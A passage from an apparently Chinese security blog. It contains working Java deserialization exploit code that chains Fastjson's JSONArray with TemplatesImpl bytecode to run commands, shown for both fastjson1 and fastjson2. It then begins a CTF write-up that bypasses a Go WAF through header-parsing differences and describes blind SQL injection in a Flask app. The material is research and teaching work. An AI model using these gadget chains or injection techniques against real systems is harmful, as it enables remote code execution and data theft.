com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        CtClass clazz = pool.makeClass(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        CtClass superClass = pool.get(AbstractTranslet.class.getName());</span><br><span class="line">        clazz.setSuperclass(superClass);</span><br><span class="line">        CtConstructor constructor = <span class="keyword">new</span> CtConstructor(<span class="keyword">new</span> CtClass[]&#123;&#125;, clazz);</span><br><span class="line">        constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;open -na Calculator\&quot;);&quot;</span>);</span><br><span class="line">        clazz.addConstructor(constructor);</span><br><span class="line">        <span class="keyword">byte</span>[][] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;clazz.toBytecode()&#125;;</span><br><span class="line">        TemplatesImpl templates = TemplatesImpl.class.newInstance();</span><br><span class="line">        setValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, bytes);</span><br><span class="line">        setValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;y4tacker&quot;</span>);</span><br><span class="line">        setValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        JSONArray jsonArray = <span class="keyword">new</span> JSONArray();</span><br><span class="line">        jsonArray.add(templates);</span><br><span class="line"></span><br><span class="line">        BadAttributeValueExpException val = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">        Field valfield = val.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        valfield.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        valfield.set(val, jsonArray);</span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        objectOutputStream.writeObject(val);</span><br><span class="line"></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        Object o = (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="fastjson2"><a href="#fastjson2" class="headerlink" title="fastjson2"></a>fastjson2</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson2.JSONArray;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        CtClass clazz = pool.makeClass(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        CtClass superClass = pool.get(AbstractTranslet.class.getName());</span><br><span class="line">        clazz.setSuperclass(superClass);</span><br><span class="line">        CtConstructor constructor = <span class="keyword">new</span> CtConstructor(<span class="keyword">new</span> CtClass[]&#123;&#125;, clazz);</span><br><span class="line">        constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;open -na Calculator\&quot;);&quot;</span>);</span><br><span class="line">        clazz.addConstructor(constructor);</span><br><span class="line">        <span class="keyword">byte</span>[][] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;clazz.toBytecode()&#125;;</span><br><span class="line">        TemplatesImpl templates = TemplatesImpl.class.newInstance();</span><br><span class="line">        setValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, bytes);</span><br><span class="line">        setValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;y4tacker&quot;</span>);</span><br><span class="line">        setValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        JSONArray jsonArray = <span class="keyword">new</span> JSONArray();</span><br><span class="line">        jsonArray.add(templates);</span><br><span class="line"></span><br><span class="line">        BadAttributeValueExpException val = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">        Field valfield = val.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        valfield.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        valfield.set(val, jsonArray);</span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        objectOutputStream.writeObject(val);</span><br><span class="line"></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        Object o = (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230320143328906.png" alt="image-20230320143328906"></p><h2 id="为什么fastjson1的1-2-49以后不再能利用"><a href="#为什么fastjson1的1-2-49以后不再能利用" class="headerlink" title="为什么fastjson1的1.2.49以后不再能利用"></a>为什么fastjson1的1.2.49以后不再能利用</h2><p>从1.2.49开始，我们的JSONArray以及JSONObject方法开始真正有了自己的readObject方法</p><p><img src="/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230320144250771.png" alt="image-20230320144250771"></p><p>在其<code>SecureObjectInputStream</code>类当中重写了<code>resolveClass</code>,在其中调用了<code>checkAutoType</code>方法做类的检查</p><p><img src="/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230320144333055.png" alt="image-20230320144333055"></p><p>如何突破呢？请看下篇文章<a href="https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/">FastJson与原生反序列化(二)</a></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Fastjson </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023BiosCTF-VulnDrive2(很实战推荐)</title>
      <link href="/2023/01/23/year/2023/1/2023BiosCTF-VulnDrive2-%E5%BE%88%E5%AE%9E%E6%88%98%E6%8E%A8%E8%8D%90/"/>
      <url>/2023/01/23/year/2023/1/2023BiosCTF-VulnDrive2-%E5%BE%88%E5%AE%9E%E6%88%98%E6%8E%A8%E8%8D%90/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="2023BiosCTF-VulnDrive2"><a href="#2023BiosCTF-VulnDrive2" class="headerlink" title="2023BiosCTF-VulnDrive2"></a>2023BiosCTF-VulnDrive2</h1><h2 id="吐槽"><a href="#吐槽" class="headerlink" title="吐槽"></a>吐槽</h2><p>比赛的时候后面完整利用已经串起来了，脑抽卡在了SSRF利用上，还是太死脑筋了</p><p>Docker备份：<a href="https://github.com/Y4tacker/CTFBackup/blob/main/2023/BiosCTF/vulndrive2.zip">https://github.com/Y4tacker/CTFBackup/blob/main/2023/BiosCTF/vulndrive2.zip</a></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>首先简单看看docker-compose.yml，发现php环境在外网</p><p>根据networks配置可知waf与其他两个环境互通，frontend与app不互通</p><p><img src="/2023/01/23/year/2023/1/2023BiosCTF-VulnDrive2-%E5%BE%88%E5%AE%9E%E6%88%98%E6%8E%A8%E8%8D%90/image-20230123170823482.png" alt="image-20230123170823482"></p><h2 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h2><p>以下为了方便叙述思路，将调整讲解的顺序，其中会涉及到部分穿插</p><h3 id="waf"><a href="#waf" class="headerlink" title="waf"></a>waf</h3><p>这个容器中运行了一个go程序</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">        <span class="string">&quot;fmt&quot;</span></span><br><span class="line">        <span class="string">&quot;log&quot;</span></span><br><span class="line">        <span class="string">&quot;net/http&quot;</span></span><br><span class="line">        <span class="string">&quot;net/http/httputil&quot;</span></span><br><span class="line">        <span class="string">&quot;net/url&quot;</span></span><br><span class="line">        <span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">var</span> invalid = [<span class="number">6</span>]<span class="keyword">string</span>&#123;<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;)&quot;</span>, <span class="string">&quot;(&quot;</span>, <span class="string">&quot;)&quot;</span>,<span class="string">&quot;=&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ProxyRequestHandler</span><span class="params">(proxy *httputil.ReverseProxy)</span> <span class="title">func</span><span class="params">(http.ResponseWriter, *http.Request)</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(r.Header.Get(<span class="string">&quot;X-pro-hacker&quot;</span>)!=<span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">                     fmt.Fprintf(w, <span class="string">&quot;Hello Hacker!\n&quot;</span>)</span><br><span class="line">                     <span class="keyword">return</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(strings.Contains(r.Header.Get(<span class="string">&quot;flag&quot;</span>), <span class="string">&quot;gimme&quot;</span>))&#123;</span><br><span class="line">                    fmt.Fprintf(w, <span class="string">&quot;No flag For you!\n&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(r.Header.Get(<span class="string">&quot;Token&quot;</span>)!=<span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">                    <span class="keyword">for</span> _, x := <span class="keyword">range</span> invalid &#123;</span><br><span class="line">                            <span class="keyword">if</span>(strings.Contains(r.Header.Get(<span class="string">&quot;Token&quot;</span>), x))&#123;</span><br><span class="line">                                fmt.Fprintf(w, <span class="string">&quot;Hello Hacker!\n&quot;</span>)</span><br><span class="line">                                <span class="keyword">return</span>  </span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">        proxy.ServeHTTP(w, r)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">        url, err := url.Parse(<span class="string">&quot;http://app:5000&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(err)</span><br><span class="line">    &#125;</span><br><span class="line">        proxy := httputil.NewSingleHostReverseProxy(url)</span><br><span class="line"></span><br><span class="line">        http.HandleFunc(<span class="string">&quot;/&quot;</span>, ProxyRequestHandler(proxy))</span><br><span class="line">        http.HandleFunc(<span class="string">&quot;/admin&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">                fmt.Fprintf(w, <span class="string">&quot;Hello World!\n&quot;</span>)</span><br><span class="line">&#125;)</span><br><span class="line">        log.Fatal(http.ListenAndServe(<span class="string">&quot;:80&quot;</span>, <span class="literal">nil</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>存在两个路由<code>/</code>与<code>/admin</code>，其中<code>/</code>路由将我们的请求转发到<code>http://app:5000</code></p><p>同时对header中的<code>X-pro-hacker</code>、<code>flag</code>、<code>Token</code>三个字段做了限制</p><p>要求<code>X-pro-hacker</code>为空，<code>flag</code>不能出现<code>gimme</code>，<code>Token</code>则是不能有<code>[6]string&#123;&quot;&#39;&quot;, &quot;\&quot;&quot;, &quot;)&quot;, &quot;(&quot;, &quot;)&quot;,&quot;=&quot;&#125;</code>这些字符</p><p>在python的flask项目中则要求<code>request.headers.get(&quot;X-pro-hacker&quot;)==&quot;Pro-hacker&quot; and &quot;gimme&quot; in request.headers.get(&quot;flag&quot;)</code>，注意一个是<code>==</code>一个是<code>in</code></p><p>这里则需要利用go与flask解析的差异性，</p><p>go当中只获取第一个header的内容，</p><p>在flask当中会把header当中的<code>_</code>替换为<code>-</code>，同时如果header双写会用<code>,</code>进行拼接</p><p>因此我们如果构造这样的请求，则可以绕过go端的校验</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line">X_pro-hacker: Pro-hacker</span><br><span class="line"><span class="attribute">flag</span><span class="punctuation">: </span></span><br><span class="line"><span class="attribute">flag</span><span class="punctuation">: </span>gimme</span><br></pre></td></tr></table></figure><p>同时在flask眼中以上内容最终会转换为</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">X-pro-hacker</span><span class="punctuation">: </span>Pro-hacker</span><br><span class="line"><span class="attribute">flag</span><span class="punctuation">: </span>,gimme</span><br></pre></td></tr></table></figure><p>接下来我们来具体看看flask部分</p><h3 id="app"><a href="#app" class="headerlink" title="app"></a>app</h3><p>首先在里面会初始化sqlite数据库，将flag保存到了users与flag两张表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_db</span>():</span></span><br><span class="line">    <span class="keyword">try</span>: </span><br><span class="line">        conn = sqlite3.connect(os.path.join(os.path.realpath(os.curdir),<span class="string">&#x27;users.db&#x27;</span>))</span><br><span class="line">        cursor = conn.cursor()</span><br><span class="line">        result = cursor.executescript(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            CREATE TABLE IF NOT EXISTS users  (</span></span><br><span class="line"><span class="string">                                                    username  TEXT, </span></span><br><span class="line"><span class="string">                                                    token TEXT</span></span><br><span class="line"><span class="string">                                                );</span></span><br><span class="line"><span class="string">            CREATE TABLE IF NOT EXISTS flag  (</span></span><br><span class="line"><span class="string">                                                flag_is_here  TEXT</span></span><br><span class="line"><span class="string">                                            );                                                  </span></span><br><span class="line"><span class="string">            Delete from users;</span></span><br><span class="line"><span class="string">            Delete from flag;</span></span><br><span class="line"><span class="string">            INSERT INTO users values (&#x27;user&#x27;,&#x27;some_randomtoken&#x27;),</span></span><br><span class="line"><span class="string">                                    (&#x27;admi&#x27;,&#x27;some_randomtoken&#x27;),</span></span><br><span class="line"><span class="string">                                    (</span></span><br><span class="line"><span class="string">                                        &#x27;admin&#x27;,</span></span><br><span class="line"><span class="string">                                        &#x27;<span class="subst">&#123;FLAG&#125;</span>&#x27;</span></span><br><span class="line"><span class="string">                                    );</span></span><br><span class="line"><span class="string">            INSERT INTO flag values (&#x27;<span class="subst">&#123;FLAG&#125;</span>&#x27;);</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span>)</span><br><span class="line">        conn.commit()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><p>程序仅有一个路由，要求header中的<code>X-pro-hacker</code>、<code>flag</code>字段为指定内容</p><p>同时根据header中的参数<code>Token</code>做数据库的查询操作</p><p>另外我们可以看到如果存在user参数那么会取前38位执行add_user操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_user</span>(<span class="params">user,token</span>):</span></span><br><span class="line">    q = <span class="string">f&quot;INSERT INTO users values (&#x27;<span class="subst">&#123;user&#125;</span>&#x27;,&#x27;<span class="subst">&#123;token&#125;</span>&#x27;)&quot;</span></span><br><span class="line">    db_query(q)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> init_db():</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> request.headers.get(<span class="string">&quot;X-pro-hacker&quot;</span>)==<span class="string">&quot;Pro-hacker&quot;</span> <span class="keyword">and</span> <span class="string">&quot;gimme&quot;</span> <span class="keyword">in</span> request.headers.get(<span class="string">&quot;flag&quot;</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> request.headers.get(<span class="string">&quot;Token&quot;</span>):         </span><br><span class="line">                token = request.headers.get(<span class="string">&quot;Token&quot;</span>)</span><br><span class="line">                token = token[:<span class="number">16</span>]</span><br><span class="line">                token = token.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> request.form.get(<span class="string">&quot;user&quot;</span>):</span><br><span class="line">                    user = request.form.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">                    user = user[:<span class="number">38</span>]</span><br><span class="line">                    add_user(user,token)            </span><br><span class="line">                query = <span class="string">f&#x27;SELECT * FROM users WHERE token=&quot;<span class="subst">&#123;token&#125;</span>&quot;&#x27;</span></span><br><span class="line">                res = db_query(query)</span><br><span class="line">                res = res.fetchone()</span><br><span class="line">                <span class="keyword">return</span> res[<span class="number">1</span>] <span class="keyword">if</span> res <span class="keyword">and</span> <span class="built_in">len</span>(res[<span class="number">0</span>])&gt;<span class="number">0</span>  <span class="keyword">else</span> <span class="string">&quot;INDEX\n&quot;</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e) </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;INDEX\n&quot;</span></span><br></pre></td></tr></table></figure><p>首先是<code>request.form.get(&quot;user&quot;)</code>,这个是POST表单的参数，我们如何能成功传递呢？毕竟当前路由只支持<code>GET</code>请求</p><p>其实flask识别<code>request.form</code>是依据Header头是否是<code>Content-Type:application/x-www-form-urlencoded</code>来判断的，因此我们只要加上并把参数放在请求体当中即可</p><p>因此很明显我们需要通过sql注入获取到flag表中flag_is_here字段的内容，由于token在go端做了字符限制，我们考虑仅在user字段中执行注入</p><p>由于flag表中仅有一个flag_is_here字段，因此我们可以用<code>*</code>替代减少payload长度</p><p>由于add_user当中为insert那么我们就可以考虑插入再查询的方式，通过盲注获取数据</p><p>构造如下，发现刚好长度为36，还预留了两个长度的位置，(毕竟flag长度也不会超过1000，所以完全够用了)，通过下面的语句我们每次可以将flag的一个字符带入到user表中</p><p><img src="/2023/01/23/year/2023/1/2023BiosCTF-VulnDrive2-%E5%BE%88%E5%AE%9E%E6%88%98%E6%8E%A8%E8%8D%90/image-20230123175853397.png" alt="image-20230123175853397"></p><p>之后我们通过select语句查询单字符的token，如果不存在则返回<code>INDEX</code>，存在则返回token内容，不断重复上述步骤即可获取到flag所有内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">query = <span class="string">f&#x27;SELECT * FROM users WHERE token=&quot;<span class="subst">&#123;token&#125;</span>&quot;&#x27;</span></span><br><span class="line">res = db_query(query)</span><br><span class="line">res = res.fetchone()</span><br><span class="line"><span class="keyword">return</span> res[<span class="number">1</span>] <span class="keyword">if</span> res <span class="keyword">and</span> <span class="built_in">len</span>(res[<span class="number">0</span>])&gt;<span class="number">0</span>  <span class="keyword">else</span> <span class="string">&quot;INDEX\n&quot;</span></span><br></pre></td></tr></table></figure><h3 id="frontend"><a href="#frontend" class="headerlink" title="frontend"></a>frontend</h3><p>上面已经串起来了最后来看看frontend部分</p><p>从Dockerfile可知环境是php8.1并且在uploads路径下有个.htaccess配置文件</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> php:<span class="number">8.1</span>-apache</span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> src/ /var/www/html/</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> mkdir /var/www/html/uploads</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> chown www-data:www-data /var/www/html/uploads</span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> .htaccess /var/www/html/uploads/</span></span><br></pre></td></tr></table></figure><p>而这个配置文件仅仅只有一行，禁止直接访问uploads路径下的文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Deny from all</span><br></pre></td></tr></table></figure><p>接下来看看代码，简简单单只有几个文件</p><p><img src="/2023/01/23/year/2023/1/2023BiosCTF-VulnDrive2-%E5%BE%88%E5%AE%9E%E6%88%98%E6%8E%A8%E8%8D%90/image-20230123171357333.png" alt="image-20230123171357333"></p><p>接下来所有代码都为去除前端样式部分，仅保留php代码</p><p>登录页面接收username参数并保存到session当中，之后根据sessionid生成隔离用户目录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//login.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!file_exists(<span class="string">&#x27;uploads&#x27;</span>)) &#123;</span><br><span class="line">    mkdir(<span class="string">&#x27;uploads&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span 